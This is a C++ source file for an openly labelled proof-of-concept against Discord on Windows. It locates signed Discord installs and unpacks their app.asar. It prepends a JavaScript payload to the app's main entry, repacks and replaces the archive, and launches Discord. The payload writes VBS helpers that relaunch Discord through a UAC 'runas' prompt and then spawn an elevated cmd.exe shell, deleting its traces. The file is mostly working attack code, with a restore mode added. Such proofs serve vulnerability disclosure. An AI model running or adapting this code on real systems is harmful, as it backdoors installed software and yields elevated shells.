#include "Poc.hpp"

#include "Asar.hpp"

#include <windows.h>
#include <shellapi.h>
#include <softpub.h>
#include <wincrypt.h>
#include <wintrust.h>

#include <algorithm>
#include <cctype>
#include <cstdint>
#include <cwctype>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iostream>
#include <iterator>
#include <sstream>
#include <string>
#include <system_error>
#include <vector>

namespace fs = std::filesystem;

namespace {

struct ProofState {
    fs::path original;
    fs::path backup;
    fs::path work;
    fs::path helper;
    fs::path shellHelper;
};

struct DiscordInstall {
    fs::path root;
    fs::path executableName;
};

struct DiscordTarget {
    fs::path executable;
    fs::path archive;
};

std::string Lower(std::string value) {
    std::transform(value.begin(), value.end(), value.begin(), [](unsigned char character) {
        return static_cast<char>(std::tolower(character));
    });
    return value;
}

std::vector<DiscordInstall> KnownDiscordInstalls() {
    wchar_t buffer[32768]{};
    const DWORD length = GetEnvironmentVariableW(L"LOCALAPPDATA", buffer, 32768);
    if (length == 0 || length >= 32768) {
        return {};
    }

    const fs::path local = buffer;
    return {
        {local / L"Discord", L"Discord.exe"},
        {local / L"DiscordPTB", L"DiscordPTB.exe"},
        {local / L"DiscordCanary", L"DiscordCanary.exe"}
    };
}

bool HasDiscordSigner(const fs::path& executable) {
    DWORD encoding = 0;
    DWORD content = 0;
    DWORD format = 0;
    HCERTSTORE store = nullptr;
    HCRYPTMSG message = nullptr;
    if (!CryptQueryObject(
            CERT_QUERY_OBJECT_FILE,
            executable.c_str(),
            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
            CERT_QUERY_FORMAT_FLAG_BINARY,
            0,
            &encoding,
            &content,
            &format,
            &store,
            &message,
            nullptr)) {
        return false;
    }

    DWORD signerSize = 0;
    bool valid = false;
    if (CryptMsgGetParam(message, CMSG_SIGNER_INFO_PARAM, 0, nullptr, &signerSize) &&
        signerSize != 0) {
        std::vector<unsigned char> signerData(signerSize);
        if (CryptMsgGetParam(
                message,
                CMSG_SIGNER_INFO_PARAM,
                0,
                signerData.data(),
                &signerSize)) {
            const auto* signer = reinterpret_cast<const CMSG_SIGNER_INFO*>(signerData.data());
            CERT_INFO certificateInfo{};
            certificateInfo.Issuer = signer->Issuer;
            certificateInfo.SerialNumber = signer->SerialNumber;
            PCCERT_CONTEXT certificate = CertFindCertificateInStore(
                store,
                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                0,
                CERT_FIND_SUBJECT_CERT,
                &certificateInfo,
                nullptr);
            if (certificate) {
                wchar_t name[512]{};
                if (CertGetNameStringW(
                        certificate,
                        CERT_NAME_SIMPLE_DISPLAY_TYPE,
                        0,
                        nullptr,
                        name,
                        512) > 1) {
                    std::wstring signerName = name;
                    std::transform(
                        signerName.begin(),
                        signerName.end(),
                        signerName.begin(),
                        [](wchar_t character) {
                            return static_cast<wchar_t>(std::towlower(character));
                        });
                    valid = signerName.find(L"discord") != std::wstring::npos;
                }
                CertFreeCertificateContext(certificate);
            }
        }
    }

    if (message) {
        CryptMsgClose(message);
    }
    if (store) {
        CertCloseStore(store, 0);
    }
    return valid;
}

bool HasTrustedDiscordSignature(const fs::path& executable) {
    WINTRUST_FILE_INFO fileInfo{};
    fileInfo.cbStruct = sizeof(fileInfo);
    fileInfo.pcwszFilePath = executable.c_str();

    WINTRUST_DATA trustData{};
    trustData.cbStruct = sizeof(trustData);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    GUID policy = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    const LONG status = WinVerifyTrust(nullptr, &policy, &trustData);
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(nullptr, &policy, &trustData);
    return status == ERROR_SUCCESS && HasDiscordSigner(executable);
}

std::vector<DiscordTarget> GetDiscordTargets() {
    std::vector<DiscordTarget> targets;
    for (const auto& install : KnownDiscordInstalls()) {
        std::error_code error;
        fs::directory_iterator iterator(
            install.root,
            fs::directory_options::skip_permission_denied,
            error);
        const fs::directory_iterator end;
        while (!error && iterator != end) {
            const fs::directory_entry entry = *iterator;
            const std::string directoryName = Lower(entry.path().filename().string());
            if (entry.is_directory(error) && directoryName.rfind("app-", 0) == 0) {
                const fs::path executable = entry.path() / install.executableName;
                const fs::path archive = entry.path() / L"resources" / L"app.asar";
                if (fs::is_regular_file(executable, error) && !error &&
                    fs::is_regular_file(archive, error) && !error &&
                    HasTrustedDiscordSignature(executable)) {
                    targets.push_back({executable, archive});
                }
            }
            iterator.increment(error);
        }
    }

    std::sort(targets.begin(), targets.end(), [](const auto& left, const auto& right) {
        return Lower(left.executable.string()) < Lower(right.executable.string());
    });
    return targets;
}

bool IsWritableDirectory(const fs::path& path) {
    const fs::path directory = path.parent_path();
    HANDLE handle = CreateFileW(
        directory.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        nullptr);
    if (handle == INVALID_HANDLE_VALUE) {
        return false;
    }
    CloseHandle(handle);
    return true;
}

fs::path TempRoot() {
    wchar_t buffer[MAX_PATH]{};
    const DWORD length = GetTempPathW(MAX_PATH, buffer);
    if (length == 0 || length >= MAX_PATH) {
        return {};
    }
    return fs::path(buffer) / L"asar-lpe-poc";
}

fs::path SystemExecutable(LPCWSTR filename) {
    wchar_t buffer[MAX_PATH]{};
    const UINT length = GetSystemDirectoryW(buffer, MAX_PATH);
    if (length == 0 || length >= MAX_PATH) {
        return {};
    }
    const fs::path executable = fs::path(buffer) / filename;
    std::error_code error;
    if (!fs::is_regular_file(executable, error) || error) {
        return {};
    }
    return executable;
}

fs::path StatePath() {
    return TempRoot() / L"state.txt";
}

enum class RecoveryReadStatus {
    Missing,
    Valid,
    Malformed,
    Unreadable
};

enum class RecoveryPathStatus {
    Missing,
    Exists,
    Unreadable
};

bool IsMissingPath(const fs::file_status& status, const std::error_code& error) {
    return status.type() == fs::file_type::not_found ||
           error.value() == ERROR_FILE_NOT_FOUND ||
           error.value() == ERROR_PATH_NOT_FOUND;
}

bool ValidateTempRoot(const fs::path& root) {
    if (root.empty() || !root.is_absolute() ||
        Lower(root.filename().string()) != "asar-lpe-poc") {
        return false;
    }

    std::error_code error;
    const fs::file_status parent = fs::symlink_status(root.parent_path(), error);
    if (error && !IsMissingPath(parent, error)) {
        return false;
    }
    if (!IsMissingPath(parent, error) && parent.type() != fs::file_type::directory) {
        return false;
    }

    error.clear();
    const fs::file_status current = fs::symlink_status(root, error);
    if (error && !IsMissingPath(current, error)) {
        return false;
    }
    if (!IsMissingPath(current, error) && current.type() != fs::file_type::directory) {
        return false;
    }
    return true;
}

bool WriteState(const ProofState& state) {
    std::error_code error;
    fs::create_directories(TempRoot(), error);
    if (error) {
        return false;
    }
    std::ofstream output(StatePath(), std::ios::binary | std::ios::trunc);
    if (!output) {
        return false;
    }
    output << state.original.string() << '\n'
           << state.backup.string() << '\n'
           << state.work.string() << '\n'
           << state.helper.string() << '\n'
           << state.shellHelper.string() << '\n';
    return static_cast<bool>(output);
}

RecoveryReadStatus ReadState(const fs::path& root, ProofState& state) {
    const fs::path marker = root / L"state.txt";
    std::error_code error;
    const fs::file_status markerStatus = fs::symlink_status(marker, error);
    if (error && !IsMissingPath(markerStatus, error)) {
        return RecoveryReadStatus::Unreadable;
    }
    if (IsMissingPath(markerStatus, error)) {
        return RecoveryReadStatus::Missing;
    }
    if (markerStatus.type() != fs::file_type::regular) {
        return RecoveryReadStatus::Malformed;
    }

    std::ifstream input(marker, std::ios::binary);
    if (!input) {
        return RecoveryReadStatus::Unreadable;
    }
    std::string original;
    std::string backup;
    std::string work;
    std::string helper;
    std::string shellHelper;
    if (!std::getline(input, original) || !std::getline(input, backup) ||
        !std::getline(input, work) || !std::getline(input, helper)) {
        return input.bad() ? RecoveryReadStatus::Unreadable :
                             RecoveryReadStatus::Malformed;
    }
    if (!std::getline(input, shellHelper)) {
        if (input.bad()) {
            return RecoveryReadStatus::Unreadable;
        }
        if (Lower(helper).ends_with(".uac.vbs")) {
            return RecoveryReadStatus::Malformed;
        }
        input.clear();
        shellHelper = helper + ".shell.vbs";
    } else {
        std::string extra;
        if (std::getline(input, extra)) {
            return RecoveryReadStatus::Malformed;
        }
    }
    if (input.bad()) {
        return RecoveryReadStatus::Unreadable;
    }
    if (original.empty() || backup.empty() || work.empty() || helper.empty() ||
        shellHelper.empty()) {
        return RecoveryReadStatus::Malformed;
    }
    state.original = original;
    state.backup = backup;
    state.work = work;
    state.helper = helper;
    state.shellHelper = shellHelper;
    return RecoveryReadStatus::Valid;
}

RecoveryPathStatus InspectRecoveryPath(const fs::path& path) {
    std::error_code error;
    const fs::file_status status = fs::symlink_status(path, error);
    if (error && !IsMissingPath(status, error)) {
        return RecoveryPathStatus::Unreadable;
    }
    return IsMissingPath(status, error) ? RecoveryPathStatus::Missing :
                                         RecoveryPathStatus::Exists;
}

bool RecoveryDirectoryHasEntries(const fs::path& root, bool& hasEntries) {
    hasEntries = false;
    std::error_code error;
    const fs::file_status status = fs::symlink_status(root, error);
    if (error && !IsMissingPath(status, error)) {
        return false;
    }
    if (IsMissingPath(status, error)) {
        return true;
    }
    if (status.type() != fs::file_type::directory) {
        return false;
    }
    fs::directory_iterator iterator(root, fs::directory_options::none, error);
    if (error) {
        return false;
    }
    hasEntries = iterator != fs::directory_iterator{};
    return true;
}

bool IsPathWithin(const fs::path& path, const fs::path& root) {
    const std::string value = Lower(path.lexically_normal().string());
    const std::string prefix = Lower(root.lexically_normal().string()) + "\\";
    return value.rfind(prefix, 0) == 0;
}

bool IsExpectedState(const ProofState& state) {
    const fs::path original = state.original.lexically_normal();
    if (Lower(original.filename().string()) != "app.asar" ||
        Lower(original.parent_path().filename().string()) != "resources") {
        return false;
    }

    const fs::path appDirectory = original.parent_path().parent_path();
    const std::string appName = Lower(appDirectory.filename().string());
    if (appName.rfind("app-", 0) != 0) {
        return false;
    }

    bool knownInstall = false;
    for (const auto& install : KnownDiscordInstalls()) {
        if (Lower(appDirectory.parent_path().string()) == Lower(install.root.string())) {
            knownInstall = true;
            break;
        }
    }

    const fs::path root = TempRoot();
    return knownInstall && !root.empty() && IsPathWithin(state.backup, root) &&
           IsPathWithin(state.work, root) && IsPathWithin(state.helper, root) &&
           IsPathWithin(state.shellHelper, root);
}

bool CurrentProcessIsElevated() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return false;
    }
    TOKEN_ELEVATION elevation{};
    DWORD size = sizeof(elevation);
    const bool elevated = GetTokenInformation(
        token,
        TokenElevation,
        &elevation,
        sizeof(elevation),
        &size) && elevation.TokenIsElevated != 0;
    CloseHandle(token);
    return elevated;
}

std::string EscapeJavaScript(const std::string& value) {
    std::string escaped;
    escaped.reserve(value.size() * 2);
    for (const char character : value) {
        if (character == '\\') {
            escaped += "\\\\";
        } else if (character == '\'') {
            escaped += "\\'";
        } else if (character == '\r') {
            escaped += "\\r";
        } else if (character == '\n') {
            escaped += "\\n";
        } else {
            escaped += character;
        }
    }
    return escaped;
}

std::string BuildProofPayload(
    const ProofState& state,
    const fs::path& workingDirectory,
    const fs::path& discordExecutable,
    const fs::path& commandProcessor,
    const fs::path& whoamiExecutable,
    const fs::path& scriptHost) {
    std::ostringstream payload;
    payload << R"js(;(function() {
  try {
    const fs = require('fs');
    const cp = require('child_process');
    const original = ')js" << EscapeJavaScript(state.original.string()) << R"js(';
    const backup = ')js" << EscapeJavaScript(state.backup.string()) << R"js(';
    const work = ')js" << EscapeJavaScript(state.work.string()) << R"js(';
    const state = ')js" << EscapeJavaScript(StatePath().string()) << R"js(';
    const helper = ')js" << EscapeJavaScript(state.helper.string()) << R"js(';
    const shellHelper = ')js" << EscapeJavaScript(state.shellHelper.string()) << R"js(';
    const workingDirectory = ')js" << EscapeJavaScript(workingDirectory.string()) << R"js(';
    const discordExecutable = ')js" << EscapeJavaScript(discordExecutable.string()) << R"js(';
    const discordDirectory = ')js" << EscapeJavaScript(discordExecutable.parent_path().string()) << R"js(';
    const commandProcessor = ')js" << EscapeJavaScript(commandProcessor.string()) << R"js(';
    const whoamiExecutable = ')js" << EscapeJavaScript(whoamiExecutable.string()) << R"js(';
    const scriptHost = ')js" << EscapeJavaScript(scriptHost.string()) << R"js(';
    function removePath(value, recursive) {
      try {
        if (typeof fs.rmSync === 'function') {
          fs.rmSync(value, { recursive: recursive, force: true });
        } else if (recursive) {
          fs.rmdirSync(value, { recursive: true });
        } else {
          fs.unlinkSync(value);
        }
        return true;
      } catch (error) {
        return false;
      }
    }
    function removeStateMarker() {
      try {
        if (!fs.lstatSync(state).isFile()) {
          return false;
        }
        fs.unlinkSync(state);
        return true;
      } catch (error) {
        return false;
      }
    }
    let elevated = false;
    try {
      const groups = cp.execFileSync(whoamiExecutable, ['/groups'], {
        encoding: 'utf8',
        timeout: 3000,
        windowsHide: true
      });
      elevated = groups.indexOf('S-1-16-12288') !== -1;
    } catch (error) {}
    if (elevated) {
      let restored = false;
      try {
        fs.copyFileSync(backup, original);
        restored = true;
      } catch (error) {}
      if (!restored) {
        setTimeout(function() { process.exit(0); }, 500);
        return;
      }
      const shellScript =
        'Set ws = CreateObject("WScript.Shell")\r\n' +
        'ws.CurrentDirectory = "' + workingDirectory + '"\r\n' +
        'ws.Run """' + commandProcessor + '""", 1, False\r\n' +
        'WScript.Sleep 2000\r\n' +
        'Set fso = CreateObject("Scripting.FileSystemObject")\r\n' +
        'On Error Resume Next\r\n' +
        'If fso.FileExists(WScript.ScriptFullName) Then fso.DeleteFile WScript.ScriptFullName, True\r\n';
      fs.writeFileSync(shellHelper, shellScript, { encoding: 'utf8' });
      const stateRemoved = removeStateMarker();
      if (!stateRemoved) {
        setTimeout(function() { process.exit(0); }, 500);
        return;
      }
      removePath(work, true);
      removePath(backup, false);
      removePath(helper, false);
      cp.spawn(scriptHost, [shellHelper], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
      setTimeout(function() { process.exit(0); }, 500);
      return;
    }
    const helperScript =
      'Set sh = CreateObject("Shell.Application")\r\n' +
      'sh.ShellExecute "' + discordExecutable + '", "", "' + discordDirectory + '", "runas", 1\r\n' +
      'WScript.Sleep 2000\r\n' +
      'Set fso = CreateObject("Scripting.FileSystemObject")\r\n' +
      'On Error Resume Next\r\n' +
      'If fso.FileExists(WScript.ScriptFullName) Then fso.DeleteFile WScript.ScriptFullName, True\r\n';
    fs.writeFileSync(helper, helperScript, { encoding: 'utf8' });
    cp.spawn(scriptHost, [helper], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
    setTimeout(function() { process.exit(0); }, 500);
  } catch (error) {
    setTimeout(function() { process.exit(0); }, 500);
  }
})();
)js";
    return payload.str();
}

bool ReadPackageMain(const fs::path& directory, fs::path& result) {
    std::ifstream input(directory / L"package.json", std::ios::binary);
    if (!input) {
        return false;
    }
    const std::string content{
        std::istreambuf_iterator<char>{input},
        std::istreambuf_iterator<char>{}};
    auto position = content.find("\"main\"");
    if (position == std::string::npos) {
        return false;
    }
    position = content.find(':', position);
    position = position == std::string::npos ? position : content.find('"', position);
    if (position == std::string::npos) {
        return false;
    }
    const auto end = content.find('"', position + 1);
    if (end == std::string::npos) {
        return false;
    }
    std::string relative = content.substr(position + 1, end - position - 1);
    std::replace(relative.begin(), relative.end(), '/', '\\');
    const fs::path candidate = directory / relative;
    if (!fs::is_regular_file(candidate)) {
        return false;
    }
    result = candidate;
    return true;
}

bool FindMainEntry(const fs::path& directory, fs::path& result) {
    if (ReadPackageMain(directory, result)) {
        return true;
    }
    const std::vector<fs::path> common{
        L"app/main.js",
        L"app/index.js",
        L"main.js",
        L"index.js",
        L"lib/main.js",
        L"lib/index.js"
    };
    for (const auto& relative : common) {
        const fs::path candidate = directory / relative;
        if (fs::is_regular_file(candidate)) {
            result = candidate;
            return true;
        }
    }
    std::error_code error;
    fs::recursive_directory_iterator iterator(
        directory,
        fs::directory_options::skip_permission_denied,
        error);
    const fs::recursive_directory_iterator end;
    while (!error && iterator != end) {
        if (iterator->is_regular_file(error) &&
            Lower(iterator->path().extension().string()) == ".js") {
            result = iterator->path();
            return true;
        }
        iterator.increment(error);
    }
    return false;
}

bool PrependPayload(const fs::path& path, const std::string& payload) {
    std::ifstream input(path, std::ios::binary);
    if (!input) {
        return false;
    }
    const std::string original{
        std::istreambuf_iterator<char>{input},
        std::istreambuf_iterator<char>{}};
    input.close();
    std::ofstream output(path, std::ios::binary | std::ios::trunc);
    if (!output) {
        return false;
    }
    output << payload << '\n' << original;
    return static_cast<bool>(output);
}

bool RestoreState(const ProofState& state, bool clearState) {
    if (!IsExpectedState(state) || !fs::is_regular_file(state.backup)) {
        return false;
    }
    std::error_code error;
    fs::copy_file(
        state.backup,
        state.original,
        fs::copy_options::overwrite_existing,
        error);
    if (error) {
        return false;
    }
    if (clearState) {
        const bool stateRemoved = fs::remove(StatePath(), error);
        if (error || !stateRemoved) {
            return false;
        }
        fs::remove_all(state.work, error);
        fs::remove(state.backup, error);
        fs::remove(state.helper, error);
        fs::remove(state.shellHelper, error);
    }
    return true;
}

void PrintManualRecovery() {
    std::cerr << "manual recovery: discord-lpe-poc.exe restore\n";
}

void PrintRecoveryDirectory(const fs::path& root) {
    std::cerr << "recovery directory: " << root.string() << '\n';
}

}

int RunScan() {
    const auto targets = GetDiscordTargets();
    if (targets.empty()) {
        std::cout << "no eligible Discord ASAR targets found\n";
        return 1;
    }

    for (std::size_t index = 0; index < targets.size(); ++index) {
        std::cout << '[' << index << "] " << targets[index].executable.string() << '\n'
                  << "    " << targets[index].archive.string() << '\n'
                  << "    writable: "
                  << (IsWritableDirectory(targets[index].archive) ? "yes" : "no")
                  << '\n';
    }
    return 0;
}

int RunProof(std::size_t index) {
    const fs::path root = TempRoot();
    if (!ValidateTempRoot(root)) {
        std::cerr << "cannot validate the temporary recovery directory\n";
        if (!root.empty()) {
            PrintRecoveryDirectory(root);
        }
        return 1;
    }

    if (CurrentProcessIsElevated()) {
        std::cerr << "run the proof from a non-elevated terminal so the UAC transition can be observed\n";
        return 1;
    }

    ProofState existing;
    const RecoveryReadStatus recoveryStatus = ReadState(root, existing);
    if (recoveryStatus == RecoveryReadStatus::Valid) {
        std::cerr << "an earlier proof state exists; close Discord and run restore first\n";
        PrintRecoveryDirectory(root);
        PrintManualRecovery();
        return 1;
    }
    if (recoveryStatus == RecoveryReadStatus::Malformed) {
        std::cerr << "malformed recovery state; preserving recovery files\n";
        PrintRecoveryDirectory(root);
        return 1;
    }
    if (recoveryStatus == RecoveryReadStatus::Unreadable) {
        std::cerr << "cannot inspect the recovery state; preserving recovery files\n";
        PrintRecoveryDirectory(root);
        return 1;
    }

    const auto targets = GetDiscordTargets();
    if (index >= targets.size()) {
        std::cerr << "target index is out of range; run scan first\n";
        return 1;
    }

    const auto& target = targets[index];
    if (!IsWritableDirectory(target.archive)) {
        std::cerr << "the Discord resources directory is not writable\n";
        return 1;
    }

    std::error_code workingDirectoryError;
    const fs::path workingDirectory = fs::current_path(workingDirectoryError);
    if (workingDirectoryError || workingDirectory.empty()) {
        std::cerr << "cannot resolve the launch working directory\n";
        return 1;
    }
    const fs::path commandProcessor = SystemExecutable(L"cmd.exe");
    const fs::path whoamiExecutable = SystemExecutable(L"whoami.exe");
    const fs::path scriptHost = SystemExecutable(L"wscript.exe");
    if (commandProcessor.empty() || whoamiExecutable.empty() || scriptHost.empty()) {
        std::cerr << "cannot resolve required Windows system executables\n";
        return 1;
    }

    const std::size_t identifier = std::hash<std::string>{}(Lower(target.archive.string()));
    ProofState state;
    state.original = target.archive;
    state.work = root / std::to_wstring(identifier);
    state.backup = root / (std::to_wstring(identifier) + L".app.asar.backup");
    state.helper = root / (std::to_wstring(identifier) + L".uac.vbs");
    state.shellHelper = root / (std::to_wstring(identifier) + L".shell.vbs");

    const std::vector<fs::path> artifacts{
        state.work,
        state.backup,
        state.helper,
        state.shellHelper
    };
    for (const auto& artifact : artifacts) {
        const RecoveryPathStatus artifactStatus = InspectRecoveryPath(artifact);
        if (artifactStatus == RecoveryPathStatus::Exists) {
            std::cerr << "recovery artifacts already exist; refusing to overwrite them\n";
            PrintRecoveryDirectory(root);
            return 1;
        }
        if (artifactStatus == RecoveryPathStatus::Unreadable) {
            std::cerr << "cannot inspect the recovery artifacts; preserving them\n";
            PrintRecoveryDirectory(root);
            return 1;
        }
    }

    std::error_code error;
    fs::create_directories(state.work, error);
    if (error) {
        std::cerr << "cannot create the proof workspace\n";
        PrintManualRecovery();
        return 1;
    }

    fs::copy_file(state.original, state.backup, fs::copy_options::none, error);
    if (error) {
        std::cerr << "cannot back up app.asar; close Discord and retry\n";
        PrintManualRecovery();
        return 1;
    }
    if (!WriteState(state)) {
        std::cerr << "cannot save recovery state\n";
        PrintRecoveryDirectory(root);
        PrintManualRecovery();
        return 1;
    }

    const fs::path unpacked = state.work / L"unpacked";
    const fs::path repacked = state.work / L"proof.asar";
    fs::create_directories(unpacked, error);
    if (error) {
        std::cerr << "cannot create the unpack directory\n";
        RunRestore();
        PrintManualRecovery();
        return 1;
    }

    if (!UnpackAsarFile(state.original.string().c_str(), unpacked.string().c_str())) {
        std::cerr << "cannot unpack app.asar\n";
        RunRestore();
        PrintManualRecovery();
        return 1;
    }

    fs::path entry;
    if (!FindMainEntry(unpacked, entry) ||
        !PrependPayload(
            entry,
            BuildProofPayload(
                state,
                workingDirectory,
                target.executable,
                commandProcessor,
                whoamiExecutable,
                scriptHost))) {
        std::cerr << "cannot prepare the fixed proof payload\n";
        RunRestore();
        PrintManualRecovery();
        return 1;
    }

    if (!PackAsarFile(unpacked.string().c_str(), repacked.string().c_str()) ||
        !VerifyAsarFile(repacked.string().c_str())) {
        std::cerr << "cannot build a valid proof archive\n";
        RunRestore();
        PrintManualRecovery();
        return 1;
    }

    if (!MoveFileExW(
            repacked.c_str(),
            state.original.c_str(),
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        std::cerr << "cannot replace app.asar; close Discord and retry\n";
        RunRestore();
        PrintManualRecovery();
        return 1;
    }

    const auto launch = reinterpret_cast<std::intptr_t>(ShellExecuteW(
        nullptr,
        L"open",
        target.executable.c_str(),
        nullptr,
        target.executable.parent_path().c_str(),
        SW_SHOWNORMAL));
    if (launch <= 32) {
        std::cerr << "the proof archive is installed but Discord could not be launched\n";
        PrintManualRecovery();
        return 1;
    }

    std::cout
        << "UAC proof launched for " << target.executable.string() << ".\n"
        << "Approve UAC to restore app.asar and open the elevated command shell in "
        << workingDirectory.string() << ".\n";
    PrintManualRecovery();
    return 0;
}

int RunRestore() {
    const fs::path root = TempRoot();
    if (!ValidateTempRoot(root)) {
        std::cerr << "cannot validate the temporary recovery directory\n";
        if (!root.empty()) {
            PrintRecoveryDirectory(root);
        }
        return 1;
    }

    ProofState state;
    const RecoveryReadStatus recoveryStatus = ReadState(root, state);
    if (recoveryStatus == RecoveryReadStatus::Missing) {
        bool hasEntries = false;
        if (!RecoveryDirectoryHasEntries(root, hasEntries)) {
            std::cerr << "cannot inspect the recovery directory; preserving it\n";
            PrintRecoveryDirectory(root);
            return 1;
        }
        if (hasEntries) {
            std::cerr << "recovery state marker is missing; preserving recovery files\n";
            PrintRecoveryDirectory(root);
            return 1;
        }
        std::cout << "no saved proof state found\n";
        return 0;
    }
    if (recoveryStatus == RecoveryReadStatus::Malformed) {
        std::cerr << "malformed recovery state; preserving recovery files\n";
        PrintRecoveryDirectory(root);
        return 1;
    }
    if (recoveryStatus == RecoveryReadStatus::Unreadable) {
        std::cerr << "cannot read the recovery state; preserving recovery files\n";
        PrintRecoveryDirectory(root);
        return 1;
    }

    if (!RestoreState(state, true)) {
        std::cerr << "restore failed; preserving recovery files\n";
        PrintRecoveryDirectory(root);
        PrintManualRecovery();
        return 1;
    }
    std::cout << "original app.asar restored\n";
    return 0;
}
